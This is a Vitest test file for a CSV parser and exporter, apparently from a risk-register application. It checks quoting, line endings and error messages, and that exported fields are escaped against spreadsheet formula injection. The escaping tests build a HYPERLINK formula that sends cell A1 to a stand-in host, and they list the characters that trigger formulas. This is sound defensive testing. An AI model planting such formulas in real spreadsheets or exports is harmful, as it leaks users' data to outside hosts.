import { describe, expect, it } from 'vitest'
import { escapeField, parseCsv, toCsv } from './csv.ts'
import { ImportError } from './errors.ts'

describe('parseCsv', () => {
  it('reads a plain table', () => {
    const table = parseCsv('id,title\nR-1,Ransomware\nR-2,Phishing\n')
    expect(table.header).toEqual(['id', 'title'])
    expect(table.rows).toEqual([
      ['R-1', 'Ransomware'],
      ['R-2', 'Phishing'],
    ])
  })

  it('strips a UTF-8 BOM rather than putting it in the first column name', () => {
    const table = parseCsv('﻿id,title\nR-1,x\n')
    expect(table.header[0]).toBe('id')
  })

  it('handles CRLF, bare CR and LF as record separators', () => {
    expect(parseCsv('a,b\r\n1,2\r\n').rows).toEqual([['1', '2']])
    expect(parseCsv('a,b\r1,2\r').rows).toEqual([['1', '2']])
    expect(parseCsv('a,b\n1,2\n').rows).toEqual([['1', '2']])
  })

  it('keeps commas, quotes and newlines inside a quoted field', () => {
    const table = parseCsv('id,title\n"R,1","He said ""no""\nthen left"\n')
    expect(table.rows[0]?.[0]).toBe('R,1')
    expect(table.rows[0]?.[1]).toBe('He said "no"\nthen left')
  })

  it('pads short rows and truncates long ones, and says so', () => {
    const table = parseCsv('a,b,c\n1,2\n1,2,3,4\n')
    expect(table.rows[0]).toEqual(['1', '2', ''])
    expect(table.rows[1]).toEqual(['1', '2', '3'])
    expect(table.warnings.join(' ')).toMatch(/did not have exactly 3 fields/)
  })

  it('discards trailing blank lines rather than inventing an empty risk', () => {
    expect(parseCsv('a,b\n1,2\n\n\n').rows).toHaveLength(1)
  })

  it('refuses an unterminated quote instead of swallowing the rest of the file', () => {
    expect(() => parseCsv('a,b\n"oops,2\n3,4\n')).toThrow(ImportError)
    try {
      parseCsv('a,b\n"oops,2\n')
    } catch (error) {
      expect((error as ImportError).code).toBe('unterminated-quote')
      // The remedy has to be something a risk manager can act on.
      expect((error as ImportError).remedy).toMatch(/spreadsheet/i)
    }
  })

  it('refuses an empty file', () => {
    expect(() => parseCsv('')).toThrow(ImportError)
  })

  it('refuses a header row that is entirely blank', () => {
    expect(() => parseCsv(',,\n1,2,3\n')).toThrow(ImportError)
  })
})

describe('escapeField', () => {
  // Every one of these, pasted into a risk title, becomes an executable
  // formula when the export is opened in Excel, LibreOffice or Sheets.
  const triggers = ['=', '+', '-', '@', '\t', '\r']

  for (const trigger of triggers) {
    it(`neutralises a leading ${JSON.stringify(trigger)}`, () => {
      const out = escapeField(`${trigger}HYPERLINK("https://x/?"&A1,"ok")`)
      expect(out.startsWith("'") || out.startsWith('"\'')).toBe(true)
    })
  }

  it('leaves an ordinary value alone', () => {
    expect(escapeField('Ransomware')).toBe('Ransomware')
  })

  it('leaves a negative number a number, so the column stays sortable', () => {
    // A likelihood offset of -2 must not export as text.
    expect(escapeField('-2')).toBe('-2')
    expect(escapeField('-0.5')).toBe('-0.5')
    expect(escapeField('-1.2e3')).toBe('-1.2e3')
  })

  it('still escapes anything that only looks numeric', () => {
    expect(escapeField('-2+3')).toBe("'-2+3")
    expect(escapeField('+1')).toBe("'+1")
    expect(escapeField('-2-cmd')).toBe("'-2-cmd")
    expect(escapeField('=2')).toBe("'=2")
  })

  it('applies the apostrophe inside the quotes, not outside them', () => {
    // Outside, the apostrophe would be data rather than an escape and the
    // formula would still run.
    const out = escapeField('=1+1,2')
    expect(out).toBe('"\'=1+1,2"')
  })

  it('escapes embedded quotes by doubling them', () => {
    expect(escapeField('say "hi"')).toBe('"say ""hi"""')
  })
})

describe('toCsv', () => {
  it('uses CRLF and quotes only what needs it', () => {
    expect(toCsv(['a', 'b'], [['1', 'x,y']])).toBe('a,b\r\n1,"x,y"\r\n')
  })

  it('writes an empty cell for a non-finite number rather than "NaN"', () => {
    expect(toCsv(['a'], [[Number.NaN]])).toBe('a\r\n\r\n')
  })

  it('round-trips through the parser', () => {
    const header = ['id', 'note']
    const rows = [['R-1', 'multi\nline, "quoted"']]
    const table = parseCsv(toCsv(header, rows))
    expect(table.header).toEqual(header)
    expect(table.rows[0]?.[1]).toBe('multi\nline, "quoted"')
  })
})
